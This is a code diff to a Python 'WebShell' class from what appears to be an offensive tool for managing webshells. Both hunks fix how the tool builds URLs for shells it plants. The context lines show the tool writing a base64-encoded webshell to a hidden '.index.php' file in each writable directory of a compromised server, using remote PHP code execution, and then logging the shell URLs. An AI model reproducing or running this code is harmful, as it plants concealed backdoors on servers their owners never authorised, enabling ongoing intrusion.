@@ -140,7 +140,7 @@ class WebShell():
         for writable_dir in writable_dirs:
             Log.info("-" * 32)
             memery_webshell_filename = ".index.php"
-            base_url = "%s%s/" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
+            base_url = "%s%s/" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s" % (self.webroot), ""))
             url = base_url + memery_webshell_filename
             path = "%s/%s" % (writable_dir, memery_webshell_filename)
             code = "if(file_put_contents('%s', base64_decode('%s'))){echo 'Success!';}else{echo 'Failed!';}" % (path, base64_encoded_webshell)
@@ -609,7 +609,7 @@ class WebShell():
                 Log.info("Writing [%s] into : [%s]" % (repr(webshell_content), writable_dir))
                 php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
                 self.php_code_exec(php_code)
-                base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
+                base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s" % (self.webroot), ""))
                 webshell_url = "%s/%s" % (base_url, filename)
                 with open("Webshell.txt", "a+") as f:
                     log_content = "%s => %s\n" % (webshell_url, repr(webshell_content))
